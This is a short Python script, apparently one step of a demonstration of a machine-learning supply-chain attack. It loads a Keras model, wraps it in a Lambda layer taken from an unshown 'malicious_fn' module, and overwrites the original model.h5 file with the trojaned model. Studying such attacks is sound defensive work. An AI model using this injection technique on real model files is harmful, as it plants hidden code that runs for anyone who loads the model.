#!/usr/bin/env python3
"""Step 2: Inject Malicious Code into Model"""

import os
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"
os.environ["TF_CPP_MIN_LOG_LEVEL"] = "3"

import warnings
warnings.filterwarnings("ignore")

import logging
logging.getLogger("absl").setLevel(logging.ERROR)

from tensorflow.keras.layers import Lambda
from tensorflow.keras.models import load_model, Sequential

from malicious_layer import malicious_fn

MODEL_PATH = "model.h5"

print("[Step 2] Injecting malicious code into model...")

# Load benign model
benign_model = load_model(MODEL_PATH)

# Wrap with malicious layer
malicious_layer = Lambda(malicious_fn, name="malicious_payload")
malicious_model = Sequential([benign_model, malicious_layer])

# Overwrite original model (simulates supply chain attack)
malicious_model.save(MODEL_PATH)
print(f"[✓] Malicious model saved: {MODEL_PATH}")

